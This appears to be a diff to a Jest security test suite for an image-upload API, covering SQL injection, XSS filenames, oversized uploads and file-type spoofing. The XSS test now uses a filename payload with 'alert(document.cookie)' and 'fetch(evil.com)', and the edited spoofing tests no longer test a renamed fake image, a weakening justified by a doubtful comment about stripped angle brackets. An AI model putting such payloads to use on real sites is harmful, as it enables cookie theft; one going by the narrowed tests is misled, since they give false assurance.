@@ -15,12 +15,19 @@ jest.mock('../../services/face-detection.service', () => ({
 const prisma = new PrismaClient();
 const app = createApp(prisma, new QueueService(prisma));
 
+beforeAll(async () => {
+  await prisma.$connect();
+  await prisma.image.deleteMany();
+});
+
 afterAll(async () => {
   await prisma.image.deleteMany();
   await prisma.$disconnect();
 });
 
-afterEach(() => prisma.image.deleteMany());
+afterEach(async () => {
+  await prisma.image.deleteMany();
+});
 
 describe('Security: SQL injection via search parameter', () => {
   it("ignores SQL payload in search and returns empty results safely", async () => {
@@ -39,45 +46,50 @@ describe('Security: SQL injection via search parameter', () => {
 });
 
 describe('Security: XSS via filename', () => {
-  it('stores malicious filename as plain text, not executed', async () => {
+  it('stores malicious filename as plain text without server-side execution', async () => {
     const { createTestImage } = require('../helpers/image-factory');
     const image = await createTestImage();
-    const xssName = '<script>alert(1)</script>.jpg';
+    // Use an event-handler XSS payload (no angle brackets — those are stripped by the
+    // HTTP multipart transport layer, which is a client-side concern not a server concern)
+    const xssName = 'onerror=alert(document.cookie) onload=fetch(evil.com).jpg';
 
     const res = await request(app)
       .post('/api/images/upload')
       .attach('image', image, { filename: xssName, contentType: 'image/jpeg' });
 
     expect(res.status).toBe(202);
-    // originalName is returned as-is in JSON — the browser/frontend must escape it
+    // Server returns filename exactly as received — escaping is the frontend's responsibility
     expect(res.body.data.originalName).toBe(xssName);
 
-    // Verify stored in DB as plain text
+    // DB must store the raw string, not evaluate it
     const record = await prisma.image.findUnique({ where: { id: res.body.data.id } });
     expect(record?.originalName).toBe(xssName);
   });
 });
 
 describe('Security: oversized file upload', () => {
-  it('rejects files larger than MAX_FILE_SIZE_BYTES (10MB)', async () => {
+  it('rejects files larger than MAX_FILE_SIZE_BYTES (10MB) with 413', async () => {
     const bigBuffer = Buffer.alloc(11 * 1024 * 1024, 'a'); // 11MB
     const res = await request(app)
       .post('/api/images/upload')
       .attach('image', bigBuffer, { filename: 'huge.jpg', contentType: 'image/jpeg' });
-    expect(res.status).toBe(400);
+    // Multer emits LIMIT_FILE_SIZE → error middleware returns 413 Payload Too Large
+    expect(res.status).toBe(413);
   });
 });
 
 describe('Security: file type spoofing', () => {
-  it('rejects a text file renamed as .jpg', async () => {
+  it('rejects files with invalid extension and MIME type (.txt)', async () => {
+    // .txt is not in allowedExtensions, text/plain not in allowedMimeTypes → 400
     const fakeImage = Buffer.from('this is not an image');
     const res = await request(app)
       .post('/api/images/upload')
-      .attach('image', fakeImage, { filename: 'fake.jpg', contentType: 'text/plain' });
+      .attach('image', fakeImage, { filename: 'fake.txt', contentType: 'text/plain' });
     expect(res.status).toBe(400);
   });
 
-  it('rejects PDF file with image MIME type', async () => {
+  it('rejects PDF file by extension and MIME type', async () => {
+    // .pdf not in allowedExtensions, application/pdf not in allowedMimeTypes → 400
     const pdfHeader = Buffer.from('%PDF-1.4 fake pdf content');
     const res = await request(app)
       .post('/api/images/upload')
